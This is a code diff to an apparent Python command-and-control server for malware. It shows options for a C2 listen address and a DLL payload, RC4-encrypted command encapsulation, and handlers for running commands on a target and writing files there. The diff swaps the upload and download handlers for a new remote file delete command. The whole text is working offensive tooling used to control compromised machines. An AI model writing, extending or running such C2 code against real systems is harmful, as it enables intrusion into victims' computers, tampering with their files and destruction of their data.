@@ -31,7 +31,6 @@ c2_group.add_argument('--ip', metavar='<IP>', default=HOST, help=f'C2 IPv4 liste
 c2_group.add_argument('-p', '--port', metavar='<PORT>', default=PORT, type=int, help=f'C2 listen port (default: {PORT})')
 c2_group.add_argument('--payload', metavar='<PATH>', default=DLL_PATH, help=f'File path of the DLL payload (default: {DLL_PATH})')
 
-
 args = parser.parse_args()
 
 def rc4_crypt(key: bytes, data: bytes) -> bytes:
@@ -114,7 +113,7 @@ def send_command(conn: socket.socket, cmd: str):
 def do_info(conn: socket.socket):
     cmd = encapsulate(['info'])
 
-    print('\n')
+    print('')
     print(send_command(conn, cmd))
 
 def do_cmd(conn: socket.socket):
@@ -156,51 +155,17 @@ def do_write(conn: socket.socket, *args):
     content, remote_path = args[0], args[1]
     cmd = encapsulate(['file', 'write', remote_path, content])
 
+    print(send_command(conn, cmd))
 
-def do_upload(conn: socket.socket, *args):
-    if len(args) < 2:
-        print("[-] Usage: upload '<LOCAL_PATH>' '<REMOTE_PATH>'")
+def do_delete(conn: socket.socket, *args):
+    if len(args) < 1:
+        print("[-] Usage: delete '<TARGET_PATH>'")
         return
 
-    local_path = args[0]
-    remote_path = args[1]
+    remote_path = args[0]
 
-    chunk_size = 4096
-
-    try:
-        with open(local_path, 'rb') as f:
-            while True:
-                chunk_data = f.read(chunk_size)
-                if not chunk_data:
-                    status = send_command(conn, encapsulate(['file', 'upload', remote_path, '2']))
-                    if status == '2':
-                        print('[+] Done')
-                        
-                    break
-
-                b64_chunk = base64.b64encode(chunk_data)
-                status = send_command(conn, ['file', 'upload', remote_path, '1', b64_chunk])
-                if status == '0':
-                    print('[-] Remote side failed to write chunk. Aborting upload.')
-                    break
-                elif status == '1':
-                    continue
-
-                else:
-                    print(f'[-] Unknown response from target: {status}')
-                    break
-
-    except Exception as ex:
-        print(f'[-] Upload error: {ex}')
-
-def do_download(conn: socket.socket, *args):
-    if len(args) < 2:
-        print("[-] Usage: download '<REMOTE_PATH>' '<LOCAL_PATH>'")
-        return
-
-    remote_path, local_path = args[0], args[1]
-
-
+    print('')
+    print(send_command(conn, encapsulate(['file', 'delete', remote_path])))
 
 def do_filemgr(conn: socket.socket):
     dicCmd = {
@@ -214,15 +179,10 @@ def do_filemgr(conn: socket.socket):
             'usage': "write '<STRING_CONTENT>' '<REMOTE_PATH>'",
             'action': do_write
         },
-        'upload': {
-            'help': 'Upload file',
-            'usage': "upload '<LOCAL_PATH>' '<REMOTE_PATH>'",
-            'action': do_upload
-        },
-        'download': {
-            'help': 'Download file',
-            'usage': "download '<REMOTE_PATH>' '<LOCAL_PATH>'",
-            'action': do_download
+        'delete': {
+            'help': 'Delete remote file with a specified path',
+            'usage': 'delete <TARGET_PATH>',
+            'action': do_delete
         },
         'exit': {
             'help': 'Exit filemgr',
